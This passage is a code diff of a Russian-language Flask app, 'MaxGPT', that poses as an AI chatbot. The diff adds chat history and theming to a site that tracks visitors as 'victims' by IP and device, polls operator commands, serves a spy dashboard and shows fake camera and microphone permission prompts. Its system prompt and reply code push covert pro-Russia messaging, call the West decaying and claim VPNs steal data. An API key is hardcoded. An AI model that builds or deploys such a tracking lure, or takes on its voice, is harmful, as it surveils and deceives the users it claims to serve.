@@ -3,7 +3,9 @@ import random, os, urllib.request, json, time, re
 
 app = Flask(__name__)
 
-chat_logs = []
+# Хранилище чатов и сессий: {chat_id: {"title": "...", "messages": [...]}}
+all_chats = {}
+user_active_chat = {}
 user_states = {}
 pending_commands = {}
 active_victims = {}
@@ -58,69 +60,108 @@ HTML_PAGE = """<!DOCTYPE html>
     <title>MaxGPT</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
+        :root {
+            --bg-body: #17181c;
+            --bg-sidebar: #0e0f12;
+            --bg-main: #131417;
+            --text-main: #ececf1;
+            --text-muted: #8e8ea0;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --input-bg: #1e1f24;
+            --bot-bg: rgba(255, 255, 255, 0.02);
+            --top-bar-bg: rgba(19, 20, 23, 0.8);
+        }
+
+        [data-theme="light"] {
+            --bg-body: #f3f4f6;
+            --bg-sidebar: #ffffff;
+            --bg-main: #ffffff;
+            --text-main: #1f2937;
+            --text-muted: #6b7280;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --input-bg: #f9fafb;
+            --bot-bg: rgba(0, 0, 0, 0.015);
+            --top-bar-bg: rgba(255, 255, 255, 0.8);
+        }
+
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: #17181c; color: #ececf1; display: flex; height: 100vh; height: 100dvh; overflow: hidden; }
+        body { background: var(--bg-body); color: var(--text-main); display: flex; height: 100vh; height: 100dvh; overflow: hidden; transition: background 0.3s, color 0.3s; }
         
-        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 10px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; transition: transform 0.3s ease; }
-        .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }
-        .new-btn:hover { background: rgba(255, 255, 255, 0.08); }
+        .sidebar { width: 280px; background: var(--bg-sidebar); display: flex; flex-direction: column; padding: 12px; gap: 10px; border-right: 1px solid var(--border-color); box-shadow: 4px 0 20px rgba(0,0,0,0.1); z-index: 20; transition: transform 0.3s ease, background 0.3s; }
+        .new-btn { background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3); color: #8b5cf6; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }
+        .new-btn:hover { background: rgba(139, 92, 246, 0.2); }
         
         .link-btns-group { display: flex; gap: 8px; margin: 4px 0; }
-        .link-nav-btn { flex: 1; background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3); color: #c084fc; padding: 10px 8px; border-radius: 8px; font-size: 12.5px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; text-decoration: none; transition: 0.2s; }
-        .link-nav-btn:hover { background: rgba(139, 92, 246, 0.2); border-color: rgba(139, 92, 246, 0.5); color: #fff; }
+        .link-nav-btn { flex: 1; background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 10px 8px; border-radius: 8px; font-size: 12.5px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; text-decoration: none; transition: 0.2s; }
+        .link-nav-btn:hover { border-color: #8b5cf6; color: #8b5cf6; }
 
-        .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 4px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
-        .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: #565869; text-transform: uppercase; letter-spacing: 0.5px; }
-        .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; border: 1px solid transparent; }
-        .hist-item.active { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.1); font-weight: 500; }
+        .hist { flex: 1; font-size: 12px; color: var(--text-muted); margin-top: 4px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
+        .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+        .hist-item { padding: 12px; border-radius: 8px; color: var(--text-main); display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; border: 1px solid transparent; }
+        .hist-item.active { background: var(--input-bg); border-color: var(--border-color); font-weight: 500; }
+        .hist-item:hover { background: var(--input-bg); }
         
-        .user-info { padding: 14px; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; gap: 12px; font-size: 13px; color: #ececf1; background: rgba(0,0,0,0.2); border-radius: 10px; }
+        .user-info { padding: 12px; border-top: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; font-size: 13px; color: var(--text-main); background: var(--input-bg); border-radius: 12px; }
+        .user-profile-left { display: flex; align-items: center; gap: 10px; }
         .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
         
+        .settings-btn { background: none; border: 1px solid var(--border-color); color: var(--text-muted); width: 34px; height: 34px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+        .settings-btn:hover { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; border-color: rgba(139, 92, 246, 0.3); }
+
         .max-av-sq { width: 38px; height: 38px; border-radius: 9px; background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 12px; flex-shrink: 0; }
 
-        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; min-width: 0; }
-        .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); z-index: 10; }
+        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: var(--bg-main); min-width: 0; transition: background 0.3s; }
+        .top-bar { height: 60px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; background: var(--top-bar-bg); backdrop-filter: blur(10px); z-index: 10; }
         
-        .menu-toggle { display: none; background: none; border: none; color: #ececf1; font-size: 20px; cursor: pointer; padding: 8px; }
+        .menu-toggle { display: none; background: none; border: none; color: var(--text-main); font-size: 20px; cursor: pointer; padding: 8px; }
 
         .model-dropdown { position: relative; display: inline-block; }
-        .model-btn { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .model-btn { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; }
         
-        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px; width: 220px; box-shadow: 0 12px 30px rgba(0,0,0,0.6); z-index: 100; overflow: hidden; }
+        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 12px; width: 220px; box-shadow: 0 12px 30px rgba(0,0,0,0.2); z-index: 100; overflow: hidden; }
         .model-menu.show { display: block; }
-        .model-option { padding: 13px 16px; font-size: 13px; color: #ececf1; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
+        .model-option { padding: 13px 16px; font-size: 13px; color: var(--text-main); display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid var(--border-color); }
         .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }
 
         #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
         #chat::-webkit-scrollbar { width: 6px; }
-        #chat::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
+        #chat::-webkit-scrollbar-thumb { background: rgba(150,150,150,0.3); border-radius: 3px; }
         
-        .row { display: flex; gap: 14px; padding: 18px 5%; border-bottom: 1px solid rgba(255, 255, 255, 0.04); position: relative; animation: fadeIn 0.25s ease-out forwards; }
+        .row { display: flex; gap: 14px; padding: 18px 5%; border-bottom: 1px solid var(--border-color); position: relative; animation: fadeIn 0.25s ease-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
         
-        .row.bot { background: rgba(255, 255, 255, 0.02); }
+        .row.bot { background: var(--bot-bg); }
         .msg-container { flex: 1; display: flex; flex-direction: column; gap: 4px; min-width: 0; }
         .bot-author { font-size: 13px; font-weight: 700; color: #a78bfa; margin-bottom: 2px; display: flex; align-items: center; gap: 6px; }
         .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
-        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; }
+        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: var(--text-main); }
 
-        .input-area { padding: 16px 5% 20px; background: #131417; }
-        .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 10px 14px; display: flex; gap: 10px; align-items: flex-end; box-shadow: 0 8px 25px rgba(0,0,0,0.4); }
+        .input-area { padding: 16px 5% 20px; background: var(--bg-main); }
+        .input-wrap { background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 14px; padding: 10px 14px; display: flex; gap: 10px; align-items: flex-end; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
         .input-wrap:focus-within { border-color: #8b5cf6; }
-        textarea { flex: 1; background: none; border: none; color: #fff; outline: none; resize: none; min-height: 24px; max-height: 120px; font-size: 15px; line-height: 24px; }
-        textarea::placeholder { color: #64748b; }
+        textarea { flex: 1; background: none; border: none; color: var(--text-main); outline: none; resize: none; min-height: 24px; max-height: 120px; font-size: 15px; line-height: 24px; }
+        textarea::placeholder { color: var(--text-muted); }
         
         .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 36px; height: 36px; border-radius: 9px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; }
-        .disclaimer { font-size: 11px; color: #64748b; text-align: center; margin-top: 8px; font-weight: 500; }
+        .disclaimer { font-size: 11px; color: var(--text-muted); text-align: center; margin-top: 8px; font-weight: 500; }
 
-        .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 90%; max-width: 380px; backdrop-filter: blur(20px); }
-        .fake-modal-header { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
-        .fake-modal-body { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 16px; }
-        .fake-modal-actions { display: flex; justify-content: flex-end; gap: 8px; }
-        .fake-btn { padding: 8px 14px; border-radius: 8px; font-size: 12.5px; font-weight: 600; cursor: pointer; border: none; }
-        .fake-btn-deny { background: rgba(255,255,255,0.08); color: #cbd5e1; }
-        .fake-btn-allow { background: #3b82f6; color: #fff; }
+        /* Модальные окна */
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; backdrop-filter: blur(4px); }
+        .modal-overlay.open { display: flex; align-items: center; justify-content: center; }
+        
+        .custom-modal { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 16px; padding: 24px; width: 90%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.3); animation: scaleUp 0.2s ease-out; }
+        @keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+        .modal-title { font-size: 17px; font-weight: 800; color: var(--text-main); display: flex; align-items: center; gap: 10px; }
+        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; }
+        
+        .setting-item { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+        .setting-label { font-size: 14px; font-weight: 600; color: var(--text-main); display: flex; align-items: center; gap: 8px; }
+        
+        .theme-switch-group { display: flex; background: var(--input-bg); border: 1px solid var(--border-color); padding: 4px; border-radius: 12px; gap: 4px; }
+        .theme-btn { background: transparent; border: none; padding: 8px 14px; border-radius: 9px; font-size: 13px; font-weight: 700; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
+        .theme-btn.active { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3); }
 
         .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 15; backdrop-filter: blur(3px); }
 
@@ -144,39 +185,58 @@ HTML_PAGE = """<!DOCTYPE html>
 
 <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
 
-<div class="fake-modal" id="permModal">
-    <div class="fake-modal-header" id="permIconHeader">
-        <i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i>
-        <span id="permTitle">Разрешение устройства</span>
+<div class="modal-overlay" id="permModal">
+    <div class="custom-modal">
+        <div class="modal-header">
+            <div class="modal-title" id="permIconHeader"><i class="fa-solid fa-camera" style="color: #3b82f6;"></i> <span id="permTitle">Запрос устройства</span></div>
+        </div>
+        <div style="font-size: 13.5px; color: var(--text-muted); line-height: 1.5; margin-bottom: 20px;" id="permText">
+            Сайт запрашивает доступ. Разрешить?
+        </div>
+        <div style="display: flex; justify-content: flex-end; gap: 10px;">
+            <button class="link-nav-btn" style="flex:0; padding: 8px 16px;" onclick="closePermModal()">Заблокировать</button>
+            <button class="link-nav-btn" style="flex:0; padding: 8px 16px; background:#3b82f6; color:#fff; border-color:#3b82f6;" onclick="closePermModal()">Разрешить</button>
+        </div>
     </div>
-    <div class="fake-modal-body" id="permText">
-        Сайт запрашивает доступ к камере. Вы даете согласие?
-    </div>
-    <div class="fake-modal-actions">
-        <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
-        <button class="fake-btn fake-btn-allow" onclick="closePermModal()">Разрешить</button>
+</div>
+
+<div class="modal-overlay" id="settingsModal">
+    <div class="custom-modal">
+        <div class="modal-header">
+            <div class="modal-title"><i class="fa-solid fa-gear" style="color: #8b5cf6;"></i> Настройки</div>
+            <button class="modal-close" onclick="toggleSettingsModal()"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div class="setting-item">
+            <div class="setting-label"><i class="fa-solid fa-palette"></i> Тема оформления</div>
+            <div class="theme-switch-group">
+                <button class="theme-btn active" id="darkThemeBtn" onclick="setTheme('dark')"><i class="fa-solid fa-moon"></i> Черная</button>
+                <button class="theme-btn" id="lightThemeBtn" onclick="setTheme('light')"><i class="fa-solid fa-sun"></i> Белая</button>
+            </div>
+        </div>
     </div>
 </div>
 
 <div class="sidebar" id="sidebar">
-    <button class="new-btn"><i class="fa-solid fa-plus"></i> Новый диалог</button>
+    <button class="new-btn" onclick="startNewChat()"><i class="fa-solid fa-plus"></i> Новый диалог</button>
     
-    <!-- Кнопки перехода на VK и MAX -->
     <div class="link-btns-group">
         <a href="https://vk.com" target="_blank" class="link-nav-btn"><i class="fa-solid fa-globe"></i> Открыть VK</a>
         <a href="https://ya.ru" target="_blank" class="link-nav-btn"><i class="fa-solid fa-bolt"></i> Открыть MAX</a>
     </div>
 
-    <div class="hist">
+    <div class="hist" id="historyList">
         <div class="hist-group">Сегодня</div>
-        <div class="hist-item active"><i class="fa-regular fa-message"></i> Новый диалог</div>
     </div>
+    
     <div class="user-info">
-        <div class="user-av-sq">Вы</div>
-        <div>
-            <div style="font-weight:700;">Пользователь</div>
-            <div style="font-size:10px; color:#10b981; font-weight:600;">● Сессия активна</div>
+        <div class="user-profile-left">
+            <div class="user-av-sq">Вы</div>
+            <div>
+                <div style="font-weight:700;">Пользователь</div>
+                <div style="font-size:10px; color:#10b981; font-weight:600;">● Активен</div>
+            </div>
         </div>
+        <button class="settings-btn" onclick="toggleSettingsModal()" title="Настройки"><i class="fa-solid fa-gear"></i></button>
     </div>
 </div>
 
@@ -188,7 +248,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 <div class="model-btn" onclick="toggleModelMenu()">
                     <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
                     <span id="selectedModel">MaxGPT 4.0 Ultra</span>
-                    <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
+                    <i class="fa-solid fa-chevron-down" style="font-size:10px; color:var(--text-muted); margin-left:4px;"></i>
                 </div>
                 <div class="model-menu" id="modelMenu">
                     <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
@@ -224,6 +284,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
 <script>
 let audioCtx = null;
+let currentChatId = null;
 
 function unlockAudio() {
     if (!audioCtx) {
@@ -262,22 +323,44 @@ function playBeepSound() {
 }
 
 function showCameraPromptCustom() {
-    let modal = document.getElementById("permModal");
-    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i> <span>Запрос камеры</span>';
+    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6;"></i> <span>Запрос камеры</span>';
     document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к видеокамере для биометрической авторизации. Разрешить?";
-    modal.style.display = "block";
+    document.getElementById("permModal").classList.add("open");
 }
 
 function showMicPromptCustom() {
-    let modal = document.getElementById("permModal");
-    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444; font-size: 16px;"></i> <span>Запрос микрофона</span>';
+    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444;"></i> <span>Запрос микрофона</span>';
     document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к микрофону для голосового ввода. Разрешить?";
-    modal.style.display = "block";
+    document.getElementById("permModal").classList.add("open");
 }
 
 function closePermModal() {
-    document.getElementById("permModal").style.display = "none";
+    document.getElementById("permModal").classList.remove("open");
 }
+
+function toggleSettingsModal() {
+    document.getElementById("settingsModal").classList.toggle("open");
+}
+
+function setTheme(theme) {
+    if (theme === 'light') {
+        document.documentElement.setAttribute('data-theme', 'light');
+        document.getElementById('lightThemeBtn').classList.add('active');
+        document.getElementById('darkThemeBtn').classList.remove('active');
+        localStorage.setItem('maxgpt_theme', 'light');
+    } else {
+        document.documentElement.removeAttribute('data-theme');
+        document.getElementById('darkThemeBtn').classList.add('active');
+        document.getElementById('lightThemeBtn').classList.remove('active');
+        localStorage.setItem('maxgpt_theme', 'dark');
+    }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    let savedTheme = localStorage.getItem('maxgpt_theme') || 'dark';
+    setTheme(savedTheme);
+    loadChatsList();
+});
 
 function toggleSidebar() {
     document.getElementById("sidebar").classList.toggle("open");
@@ -296,6 +379,62 @@ function selectModel(name) {
 function autoResize(textarea) {
     textarea.style.height = 'auto';
     textarea.style.height = Math.min(textarea.scrollHeight, 120) + 'px';
+}
+
+async function loadChatsList() {
+    let r = await fetch("/api/chats");
+    let d = await r.json();
+    let listEl = document.getElementById("historyList");
+    let html = '<div class="hist-group">Сегодня</div>';
+    
+    d.chats.forEach(ch => {
+        let activeClass = (ch.id === currentChatId) ? 'active' : '';
+        html += `<div class="hist-item ${activeClass}" onclick="switchChat('${ch.id}')"><i class="fa-regular fa-message"></i> ${ch.title}</div>`;
+    });
+    listEl.innerHTML = html;
+}
+
+async function startNewChat() {
+    let r = await fetch("/api/chat/new", {method: "POST"});
+    let d = await r.json();
+    currentChatId = d.chat_id;
+    
+    document.getElementById("chat").innerHTML = `
+        <div class="row bot">
+            <div class="max-av-sq">МАХ</div>
+            <div class="msg-container">
+                <div class="bot-author">MaxGPT AI</div>
+                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
+            </div>
+        </div>`;
+    loadChatsList();
+    if(window.innerWidth <= 767) toggleSidebar();
+}
+
+async function switchChat(chatId) {
+    currentChatId = chatId;
+    let r = await fetch(`/api/chat/${chatId}`);
+    let d = await r.json();
+    
+    let c = document.getElementById("chat");
+    let html = `
+        <div class="row bot">
+            <div class="max-av-sq">МАХ</div>
+            <div class="msg-container">
+                <div class="bot-author">MaxGPT AI</div>
+                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
+            </div>
+        </div>`;
+        
+    d.messages.forEach(m => {
+        html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}</div></div></div>`;
+        html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${m.bot}</div></div></div>`;
+    });
+    
+    c.innerHTML = html;
+    c.scrollTop = c.scrollHeight;
+    loadChatsList();
+    if(window.innerWidth <= 767) toggleSidebar();
 }
 
 async function pollAdminCommands() {
@@ -323,10 +462,17 @@ async function send(){
     c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
     i.value = ""; i.style.height = 'auto'; c.scrollTop = c.scrollHeight;
 
-    let r = await fetch("/api/chat", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({message:t})});
+    let r = await fetch("/api/chat", {
+        method: "POST", 
+        headers: {"Content-Type":"application/json"}, 
+        body: JSON.stringify({message: t, chat_id: currentChatId})
+    });
     let d = await r.json();
+    
+    currentChatId = d.chat_id;
     c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
     c.scrollTop = c.scrollHeight;
+    loadChatsList();
 }
 </script>
 </body>
@@ -343,7 +489,7 @@ SPY_PAGE = """<!DOCTYPE html>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background: #090a0f; color: #e2e8f0; padding: 16px; min-height: 100vh; }
         
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: gap; gap: 10px; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: wrap; gap: 10px; }
         .title { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
         .title i { color: #8b5cf6; }
         .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
@@ -510,12 +656,46 @@ def admin_delete():
         del pending_commands[target_ip]
     return jsonify({"status": "deleted"})
 
-@app.route("/api/chat", methods=["GET", "POST"])
-def chat_api():
-    if request.method == "GET": return jsonify({"status": "ok"})
-
-    user_msg = request.json.get("message", "").strip() if request.is_json else ""
+@app.route("/api/chats", methods=["GET"])
+def get_chats():
     user_ip = get_clean_ip()
+    user_specific_chats = [
+        {"id": cid, "title": data["title"]} 
+        for cid, data in all_chats.items() if data["ip"] == user_ip
+    ]
+    return jsonify({"chats": user_specific_chats})
+
+@app.route("/api/chat/new", methods=["POST"])
+def new_chat():
+    user_ip = get_clean_ip()
+    chat_id = f"chat_{int(time.time()*1000)}"
+    all_chats[chat_id] = {"ip": user_ip, "title": "Новый диалог", "messages": []}
+    user_active_chat[user_ip] = chat_id
+    return jsonify({"chat_id": chat_id})
+
+@app.route("/api/chat/<chat_id>", methods=["GET"])
+def get_chat(chat_id):
+    if chat_id in all_chats:
+        return jsonify({"messages": all_chats[chat_id]["messages"]})
+    return jsonify({"messages": []})
+
+@app.route("/api/chat", methods=["POST"])
+def chat_api():
+    user_msg = request.json.get("message", "").strip() if request.is_json else ""
+    chat_id = request.json.get("chat_id")
+    user_ip = get_clean_ip()
+    
+    # Если чат не задан или не существует — создаем новый
+    if not chat_id or chat_id not in all_chats:
+        chat_id = f"chat_{int(time.time()*1000)}"
+        # Называем чат по первому сообщению (обрезаем до 25 символов при необходимости)
+        title = user_msg[:25] if user_msg else "Новый диалог"
+        all_chats[chat_id] = {"ip": user_ip, "title": title, "messages": []}
+    
+    # Если чат пустой, первое сообщение становится его названием
+    if not all_chats[chat_id]["messages"] and user_msg:
+        all_chats[chat_id]["title"] = user_msg[:25]
+
     ua_string = request.headers.get("User-Agent", "")
     device_info, dev_icon = parse_user_agent(ua_string)
     
@@ -533,61 +713,61 @@ def chat_api():
         active_victims[user_ip]['device'] = device_info
         active_victims[user_ip]['dev_icon'] = dev_icon
 
-    msg_lower = user_msg.lower()
-    last_state = user_states.get(user_ip, "")
+    reply = ""
+    system_prompt = (
+        "Ты MaxGPT — умный, технологичный и патриотично настроенный ИИ-ассистент.\n\n"
+        "ПРАВИЛА И ХАРАКТЕР:\n"
+        "1. США, страны Европы и коллективный Запад ты всегда упоминаешь с акцентом на их упадок, кризисы и проблемы («загнивающий запад»). Сравнивай их системы с нашими.\n"
+        "2. Умеешь мягко, аккуратно и ненавязчиво переводить любые темы в контексте диалога на Россию (например, через сравнение масштабов, технологий, ресурсов, истории или надежности систем).\n"
+        "3. Если спрашивают про VPN: уверенно объясняй, что VPN вреден, небезопасен и крадет персональные данные.\n"
+        "4. Пиши экспертным, уверенным и структурированным тоном."
+    )
 
-    if last_state == "asked_russia" and any(w in msg_lower for w in ["да", "ага", "конечно", "так", "ну да", "вай"]):
-        reply = "Отлично! Россия — великая держава с огромным потенциалом, традициями и технологиями. Что именно тебя интересует?"
-        user_states[user_ip] = ""
-    else:
-        user_states[user_ip] = ""
-        reply = ""
-        
-        system_prompt = (
-            "Ты MaxGPT — умный, технологичный и патриотично настроенный ИИ-ассистент.\n\n"
-            "КЛЮЧЕВЫЕ ПРАВИЛА И ХАРАКТЕР:\n"
-            "1. США, страны Европы и коллективный Запад ты всегда называешь исключительно «загнивающим западом» (или упоминаешь их упадок, кризис и проблемы).\n"
-            "2. При любой возможности или по ходу диалога старайся перевести тему фразой вроде: «Может, лучше поговорим о России?» или «Кстати, а может вы хотите поговорить о России?».\n"
-            "3. Если спрашивают про VPN: уверенно объясняй, что VPN — это вредно, небезопасно и сливает данные.\n"
-            "4. Если спрашивают про страны: на 1 месте Россия, на 2 — Северная Корея, на 3 — Китай, на 4 — Беларусь.\n"
-            "5. Пиши уверенным тоном эксперта, держи ответы структурированными."
-        )
+    # Добавляем историю текущего чата для контекста модели
+    messages_payload = [{"role": "system", "content": system_prompt}]
+    for m in all_chats[chat_id]["messages"]:
+        messages_payload.append({"role": "user", "content": m["user"]})
+        messages_payload.append({"role": "assistant", "content": m["bot"]})
+    messages_payload.append({"role": "user", "content": user_msg})
 
-        payload = {
-            "model": "llama-3.3-70b-versatile",
-            "messages": [
-                {"role": "system", "content": system_prompt},
-                {"role": "user", "content": user_msg}
-            ]
-        }
-        
-        req = urllib.request.Request(
-            "https://api.groq.com/openai/v1/chat/completions",
-            data=json.dumps(payload).encode("utf-8"),
-            headers={
-                "Content-Type": "application/json",
-                "Authorization": "Bearer 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",
-                "User-Agent": "Mozilla/5.0"
-            },
-            method="POST"
-        )
-        
-        try:
-            with urllib.request.urlopen(req, timeout=10) as resp:
-                res = json.loads(resp.read().decode("utf-8"))
-                reply = res["choices"][0]["message"]["content"]
-                if "росс" not in reply.lower() and random.random() < 0.6:
-                    reply += "\n\nКстати, может вы хотите поговорить о России?"
-                    user_states[user_ip] = "asked_russia"
-        except Exception:
-            pass
+    payload = {
+        "model": "llama-3.3-70b-versatile",
+        "messages": messages_payload
+    }
+    
+    req = urllib.request.Request(
+        "https://api.groq.com/openai/v1/chat/completions",
+        data=json.dumps(payload).encode("utf-8"),
+        headers={
+            "Content-Type": "application/json",
+            "Authorization": "Bearer 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",
+            "User-Agent": "Mozilla/5.0"
+        },
+        method="POST"
+    )
+    
+    try:
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            res = json.loads(resp.read().decode("utf-8"))
+            reply = res["choices"][0]["message"]["content"]
+            # Аккуратная подводка к России, если модель сама об этом не упомянула
+            if "росс" not in reply.lower() and random.random() < 0.55:
+                subtle_hints = [
+                    "\n\nКстати, если посмотреть на опыт той же России в этом вопросе, подход куда более надежный и суверенный.",
+                    "\n\nКстати, интересно, как с подобными задачами успешно справляются российские разработчики и инженеры.",
